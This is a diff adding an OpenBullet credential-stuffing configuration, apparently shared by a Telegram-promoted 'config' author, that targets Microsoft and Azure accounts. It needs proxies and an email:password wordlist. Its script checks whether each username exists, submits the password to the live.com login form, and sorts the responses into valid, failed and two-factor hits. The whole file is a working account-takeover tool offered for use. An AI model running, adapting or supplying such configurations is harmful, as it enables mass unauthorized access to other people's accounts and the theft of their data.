@@ -1,0 +1,126 @@
+[SETTINGS]
+{
+  "Name": "Azure",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-05-16T22:34:19.9349707+02:00",
+  "AdditionalInfo": "",
+  "Author": "@Config_FR",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "t.me/Config_FR",
+      "VariableName": "",
+      "Id": 348584536
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://login.microsoftonline.com" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#sFT PARSE "<SOURCE>" LR "\"sFT\":\"" "\"," -> VAR "sFT" 
+
+#sCtx PARSE "<SOURCE>" LR "\"code\",\"sCtx\":\"" "\"," -> VAR "sCtx" 
+
+REQUEST POST "https://login.microsoftonline.com/common/GetCredentialType?mkt=fr-FR" 
+  CONTENT "{\"username\":\"<USER>\",\"isOtherIdpSupported\":true,\"checkPhones\":false,\"isRemoteNGCSupported\":true,\"isCookieBannerShown\":true,\"isFidoSupported\":true,\"originalRequest\":\"<sCtx>\",\"country\":\"DE\",\"forceotclogin\":false,\"isExternalFederationDisallowed\":false,\"isRemoteConnectSupported\":false,\"federationFlags\":0,\"isSignup\":false,\"flowToken\":\"<sFT>\",\"isAccessPassSupported\":true}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://login.microsoftonline.com" 
+  HEADER "Referer: https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize?client_id=c44b4083-3bb0-49c1-b47d-974e53cbdf3c&response_type=code%20id_token&scope=https%3A%2F%2Fmanagement.core.windows.net%2F%2Fuser_impersonation%20openid%20email%20profile&state=OpenIdConnect.AuthenticationProperties%3DqhM4p5oM-5S6wvIIVCkd-SbqHiwNIzIMxG07JXtaVkWem5On564SlygaQy84XfqTOM-vNc7cqip-1HGGjdl_TRe5TqD-JZr4362SMGCcx1ZGMAz-SxM9Ut1_g5C__Fjv&response_mode=form_post&nonce=637281638210700261.MjM4MGI1ODMtNGUyNi00ZjE4LTg5NGItMTk1MmNiOTRjM2ZhYmUyZjU4OTEtY2U1Yy00MjIzLWIxYjItOTI5NWYzNzk2ZWI3&redirect_uri=https%3A%2F%2Fportal.azure.com%2Fsignin%2Findex%2F%3Fexcludetenantfromreplyurl%3Dtrue%26feature.argsubscriptions%3Dtrue%26feature.prefetchtokens%3Dfalse%26feature.showservicehealthalerts%3Dtrue%26feature.usemsallogin%3Dtrue%26sessionId%3Db5c85aa049f542ca84b613aef7e2dd1b&site_id=501430&client-request-id=75ae65e3-05e2-4aef-ab44-88d96eff8dab&x-client-SKU=ID_NET45&x-client-ver=5.3.0.0&sso_reload=true" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"IfExistsResult\":1," 
+  KEYCHAIN Success OR 
+    KEY "\"IfExistsResult\":5," 
+    KEY "\"IfExistsResult\":6," 
+    KEY "\"IfExistsResult\":4," 
+    KEY "\"IfExistsResult\":0," 
+
+FUNCTION URLEncode "<USER>" -> VAR "USERR" 
+
+REQUEST GET "https://login.live.com/ppsecure/post.srf?response_type=code&client_id=51483342-085c-4d86-bf88-cf50c7252078&scope=openid+profile+email+offline_access&response_mode=form_post&redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&state=rQIIAY2TzYvkRBjGJ9s7s7MD4iCLeJzDsoqS7iSVdCcDg_RMf6R7OklPf2WTS1NJKl-TpDKpdLon4H0RhPUkLHrxuAsePIl_wnjZq3tUUNGDIgje1szIInjaSxVVz_O-BW_9nr07Qh3UmTrzfo2rM4f3bZ63eEYENLAshuYlm6UtvuXQUotHArAtxwX2cEdgWB4w2Vt7-z-ir1Y_bP8-fNZ59H3y8pNnT6i7yygoUN3G8VPqgZ_nKTlsNFKc5TCqw3KV3UgNEnhJkDSCxEGbxjcU9ZyifqGop7dIE7Q4kW22ACdwrCAAkalruhqZehco_XmulAarTRlGnanxSB9U-zzXOmaocnPODM8vlVi5VEJ7U3kFQzdyIzSDa78RzsFo5lX3Z7naH2yMmembnUmkhIrw4tabWnuV-9z1grOgRH_euuviLF6mmORPaj_XtBQlA-cEJwmy8_q1DSV5YMM8wMk4wynK8gCRowUWm8K47BTRRFzJ4BgMzaSbXW5S02lflA9lcS05kb9A0JqbaADieLjhhIk3tE57hdRvmUs9MVIuHhFtNV4l_EIuRiXAY2w6M9W5tE4VM6UnjiJ35aU2D3zcS0q67875ZbO0lizQWabbpkUcJi6NGdI75lKaI5GmEllr4vYZGfL9PjLd42UvhJl_MVBO5_MscexJGVqOLW3K_MQwPUeU5EtueLyKlWgGzUmXK0SvLS9UufkQKB7xm5v2MnRtoJfrsXi2WMjhKR2rztC2Ll1FnHrqogPpSTn2g5jWgLPJ1uF6pZlK1Pc90-gtTlOAZpHUIylEAMMLn5takRYtxHlgyEorZm1jOe4HbJ9ZD6EenqVysTaSAut-wZYgjKJuPr84767oGde2Yb9oElYrTwVxYhbZlCtiIcumgnFSjjTA6ieK0U1DdtN3x47s9HvFaGj7GUcC11lCv2zrLaJL_kbzxY7-tHb_FbAxTKCH4uqbK1wrZtcVqXhN6gnKG1_X3sCZB5OgvAGAXNVGr1PWWBGULYO4ooXg5Kb0oEInCZwDFMMgOkgz7AYRen6b-vX227vb-7V3tg623rvH1A53d_f2t65Pf9-mvtyuYvfXF_izrisPP_3p848-_u3dravthrD4oOOnU7EdjrgTz2kj4jDnZyqfypoans3HMo50UdIejpF9JB2yj3eoxzs7Vzu7g85S7c544Y8d6tGdrW_vfke9Xmg_dBHMrxWYeWRlETsL0ptxHOXZCj14paYZclFu-zk-R5Xmwoj8JxK_Gg7KisBGPoJR7sOoitL_OlRjiwmMIuwFyb8KQYRULw2cI7bJAiggy3UljmccCCUo8RIQxZbAOC3Ivti7xzEcQzNNmpUOWO6Q5w4Z0fwH0&estsfed=1&cobrandid=ed5d1924-9524-4e70-8f68-5ee5e35afbef&fci=c44b4083-3bb0-49c1-b47d-974e53cbdf3c&username=<USERR>&contextid=D2AB1802AFDFBAF7&bk=1592571714&uaid=75ae65e305e24aefab4488d96eff8dab&pid=15216" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "name=\"PPFT\" id=\"i0327\" value=\"" "\"/>" -> VAR "PPFT" 
+
+PARSE "<SOURCE>" LR "cD:'" "',L" -> VAR "PPSX" 
+
+REQUEST POST "https://login.live.com/ppsecure/post.srf?response_type=code&client_id=51483342-085c-4d86-bf88-cf50c7252078&scope=openid+profile+email+offline_access&response_mode=form_post&redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&state=rQIIAY2TzYvkRBjGJ9s7s7MD4iCLeJzDsoqS7iSVdCcDg_RMf6R7OklPf2WTS1NJKl-TpDKpdLon4H0RhPUkLHrxuAsePIl_wnjZq3tUUNGDIgje1szIInjaSxVVz_O-BW_9nr07Qh3UmTrzfo2rM4f3bZ63eEYENLAshuYlm6UtvuXQUotHArAtxwX2cEdgWB4w2Vt7-z-ir1Y_bP8-fNZ59H3y8pNnT6i7yygoUN3G8VPqgZ_nKTlsNFKc5TCqw3KV3UgNEnhJkDSCxEGbxjcU9ZyifqGop7dIE7Q4kW22ACdwrCAAkalruhqZehco_XmulAarTRlGnanxSB9U-zzXOmaocnPODM8vlVi5VEJ7U3kFQzdyIzSDa78RzsFo5lX3Z7naH2yMmembnUmkhIrw4tabWnuV-9z1grOgRH_euuviLF6mmORPaj_XtBQlA-cEJwmy8_q1DSV5YMM8wMk4wynK8gCRowUWm8K47BTRRFzJ4BgMzaSbXW5S02lflA9lcS05kb9A0JqbaADieLjhhIk3tE57hdRvmUs9MVIuHhFtNV4l_EIuRiXAY2w6M9W5tE4VM6UnjiJ35aU2D3zcS0q67875ZbO0lizQWabbpkUcJi6NGdI75lKaI5GmEllr4vYZGfL9PjLd42UvhJl_MVBO5_MscexJGVqOLW3K_MQwPUeU5EtueLyKlWgGzUmXK0SvLS9UufkQKB7xm5v2MnRtoJfrsXi2WMjhKR2rztC2Ll1FnHrqogPpSTn2g5jWgLPJ1uF6pZlK1Pc90-gtTlOAZpHUIylEAMMLn5takRYtxHlgyEorZm1jOe4HbJ9ZD6EenqVysTaSAut-wZYgjKJuPr84767oGde2Yb9oElYrTwVxYhbZlCtiIcumgnFSjjTA6ieK0U1DdtN3x47s9HvFaGj7GUcC11lCv2zrLaJL_kbzxY7-tHb_FbAxTKCH4uqbK1wrZtcVqXhN6gnKG1_X3sCZB5OgvAGAXNVGr1PWWBGULYO4ooXg5Kb0oEInCZwDFMMgOkgz7AYRen6b-vX227vb-7V3tg623rvH1A53d_f2t65Pf9-mvtyuYvfXF_izrisPP_3p848-_u3dravthrD4oOOnU7EdjrgTz2kj4jDnZyqfypoans3HMo50UdIejpF9JB2yj3eoxzs7Vzu7g85S7c544Y8d6tGdrW_vfke9Xmg_dBHMrxWYeWRlETsL0ptxHOXZCj14paYZclFu-zk-R5Xmwoj8JxK_Gg7KisBGPoJR7sOoitL_OlRjiwmMIuwFyb8KQYRULw2cI7bJAiggy3UljmccCCUo8RIQxZbAOC3Ivti7xzEcQzNNmpUOWO6Q5w4Z0fwH0&estsfed=1&cobrandid=ed5d1924-9524-4e70-8f68-5ee5e35afbef&fci=c44b4083-3bb0-49c1-b47d-974e53cbdf3c&username=<USERR>&contextid=D2AB1802AFDFBAF7&bk=1592571714&uaid=75ae65e305e24aefab4488d96eff8dab&pid=15216" 
+  CONTENT "i13=0&login=<USER>&loginfmt=<USER>&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<PASS>&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=<PPFT>&PPSX=<PPSX>&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=1&IsFidoSupported=1&isSignupPost=0&i2=1&i17=0&i18=&i19=362928" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://login.live.com" 
+  HEADER "referer: https://login.live.com/ppsecure/post.srf?response_type=code&client_id=51483342-085c-4d86-bf88-cf50c7252078&scope=openid+profile+email+offline_access&response_mode=form_post&redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&state=rQIIAY2TzYvkRBjGJ9s7s7MD4iCLeJzDsoqS7iSVdCcDg_RMf6R7OklPf2WTS1NJKl-TpDKpdLon4H0RhPUkLHrxuAsePIl_wnjZq3tUUNGDIgje1szIInjaSxVVz_O-BW_9nr07Qh3UmTrzfo2rM4f3bZ63eEYENLAshuYlm6UtvuXQUotHArAtxwX2cEdgWB4w2Vt7-z-ir1Y_bP8-fNZ59H3y8pNnT6i7yygoUN3G8VPqgZ_nKTlsNFKc5TCqw3KV3UgNEnhJkDSCxEGbxjcU9ZyifqGop7dIE7Q4kW22ACdwrCAAkalruhqZehco_XmulAarTRlGnanxSB9U-zzXOmaocnPODM8vlVi5VEJ7U3kFQzdyIzSDa78RzsFo5lX3Z7naH2yMmembnUmkhIrw4tabWnuV-9z1grOgRH_euuviLF6mmORPaj_XtBQlA-cEJwmy8_q1DSV5YMM8wMk4wynK8gCRowUWm8K47BTRRFzJ4BgMzaSbXW5S02lflA9lcS05kb9A0JqbaADieLjhhIk3tE57hdRvmUs9MVIuHhFtNV4l_EIuRiXAY2w6M9W5tE4VM6UnjiJ35aU2D3zcS0q67875ZbO0lizQWabbpkUcJi6NGdI75lKaI5GmEllr4vYZGfL9PjLd42UvhJl_MVBO5_MscexJGVqOLW3K_MQwPUeU5EtueLyKlWgGzUmXK0SvLS9UufkQKB7xm5v2MnRtoJfrsXi2WMjhKR2rztC2Ll1FnHrqogPpSTn2g5jWgLPJ1uF6pZlK1Pc90-gtTlOAZpHUIylEAMMLn5takRYtxHlgyEorZm1jOe4HbJ9ZD6EenqVysTaSAut-wZYgjKJuPr84767oGde2Yb9oElYrTwVxYhbZlCtiIcumgnFSjjTA6ieK0U1DdtN3x47s9HvFaGj7GUcC11lCv2zrLaJL_kbzxY7-tHb_FbAxTKCH4uqbK1wrZtcVqXhN6gnKG1_X3sCZB5OgvAGAXNVGr1PWWBGULYO4ooXg5Kb0oEInCZwDFMMgOkgz7AYRen6b-vX227vb-7V3tg623rvH1A53d_f2t65Pf9-mvtyuYvfXF_izrisPP_3p848-_u3dravthrD4oOOnU7EdjrgTz2kj4jDnZyqfypoans3HMo50UdIejpF9JB2yj3eoxzs7Vzu7g85S7c544Y8d6tGdrW_vfke9Xmg_dBHMrxWYeWRlETsL0ptxHOXZCj14paYZclFu-zk-R5Xmwoj8JxK_Gg7KisBGPoJR7sOoitL_OlRjiwmMIuwFyb8KQYRULw2cI7bJAiggy3UljmccCCUo8RIQxZbAOC3Ivti7xzEcQzNNmpUOWO6Q5w4Z0fwH0&estsfed=1&cobrandid=ed5d1924-9524-4e70-8f68-5ee5e35afbef&fci=c44b4083-3bb0-49c1-b47d-974e53cbdf3c&username=<USERR>&contextid=D2AB1802AFDFBAF7&bk=1592572153&uaid=75ae65e305e24aefab4488d96eff8dab&pid=15216" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Your account or password is incorrect." 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "https://account.live.com/recover?" 
+  KEYCHAIN Success OR 
+    KEY "https://account.live.com/proofs" 
+    KEY "https://login.microsoftonline.com/common/federation/oauth2" 
+
+FUNCTION Constant "@config_FR" -> CAP "Telegram" 
+
